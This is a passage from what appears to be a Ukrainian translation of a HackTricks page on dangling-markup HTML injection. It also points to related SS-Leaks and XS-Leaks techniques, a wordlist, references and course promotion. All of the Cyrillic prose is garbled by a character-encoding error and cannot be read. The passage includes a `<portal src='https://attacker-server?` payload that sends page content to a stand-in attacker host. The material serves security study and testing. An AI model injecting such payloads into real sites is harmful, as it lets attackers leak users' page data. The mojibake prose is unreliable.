–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –¥—É–∂–µ **—Ü—ñ–∫–∞–≤–µ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è** –ø—Ä–æ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, —è–∫—ñ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏, —Ç–µ–≥—É \<portal [—Ç—É—Ç](https://research.securitum.com/security-analysis-of-portal-element/).\
–ù–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–Ω—è —Ü—å–æ–≥–æ —Ç–µ–∫—Å—Ç—É –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —É–≤—ñ–º–∫–Ω—É—Ç–∏ —Ç–µ–≥ portal —É Chrome –≤ `chrome://flags/#enable-portals`, —ñ–Ω–∞–∫—à–µ –≤—ñ–Ω –Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ.
```html
<portal src='https://attacker-server?
```
### HTML Leaks

–ù–µ –≤—Å—ñ —Å–ø–æ—Å–æ–±–∏ –≤–∏—Ç–æ–∫—É –∑'—î–¥–Ω–∞–Ω–Ω—è –≤ HTML –±—É–¥—É—Ç—å –∫–æ—Ä–∏—Å–Ω—ñ –¥–ª—è Dangling Markup, –∞–ª–µ —ñ–Ω–æ–¥—ñ —Ü–µ –º–æ–∂–µ –¥–æ–ø–æ–º–æ–≥—Ç–∏. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —ó—Ö —Ç—É—Ç: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Leaks

–¶–µ **–º—ñ–∫—Å** –º—ñ–∂ **dangling markup —ñ XS-Leaks**. –ó –æ–¥–Ω–æ–≥–æ –±–æ–∫—É, –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥–æ–∑–≤–æ–ª—è—î **–≤–ø—Ä–æ–≤–∞–¥–∂—É–≤–∞—Ç–∏ HTML** (–∞–ª–µ –Ω–µ JS) –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ **—Ç–æ–≥–æ –∂ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è**, —â–æ –π —Ç–∞, —è–∫—É –º–∏ –±—É–¥–µ–º–æ –∞—Ç–∞–∫—É–≤–∞—Ç–∏. –ó —ñ–Ω—à–æ–≥–æ –±–æ–∫—É, –º–∏ –Ω–µ –±—É–¥–µ–º–æ **–∞—Ç–∞–∫—É–≤–∞—Ç–∏** –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ —Å—Ç–æ—Ä—ñ–Ω–∫—É, –Ω–∞ —è–∫—ñ–π –º–æ–∂–µ–º–æ –≤–ø—Ä–æ–≤–∞–¥–∂—É–≤–∞—Ç–∏ HTML, –∞ **—ñ–Ω—à—É —Å—Ç–æ—Ä—ñ–Ω–∫—É**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-Search –æ—Ä—ñ—î–Ω—Ç–æ–≤–∞–Ω—ñ –Ω–∞ **–µ–∫—Å—Ç—Ä–∞–∫—Ü—ñ—é –∫—Ä–æ—Å-–¥–æ–º–µ–Ω–Ω–∏—Ö –¥–∞–Ω–∏—Ö**, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ **–±—ñ—á–Ω–∏–º–∏ –∞—Ç–∞–∫–∞–º–∏**. –¢–æ–º—É —Ü–µ —ñ–Ω—à–∞ —Ç–µ—Ö–Ω—ñ–∫–∞, –Ω—ñ–∂ Dangling Markup, –æ–¥–Ω–∞–∫ –¥–µ—è–∫—ñ –∑ —Ç–µ—Ö–Ω—ñ–∫ –∑–ª–æ–≤–∂–∏–≤–∞—é—Ç—å –≤–∫–ª—é—á–µ–Ω–Ω—è–º HTML —Ç–µ–≥—ñ–≤ (–∑ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è–º JS —ñ –±–µ–∑), —è–∫ [**CSS Injection**](../xs-search/#css-injection) –∞–±–æ [**Lazy Load Images**](../xs-search/#image-lazy-loading)**.**

{% content-ref url="../xs-search/" %}
[xs-search](../xs-search/)
{% endcontent-ref %}

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## References

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
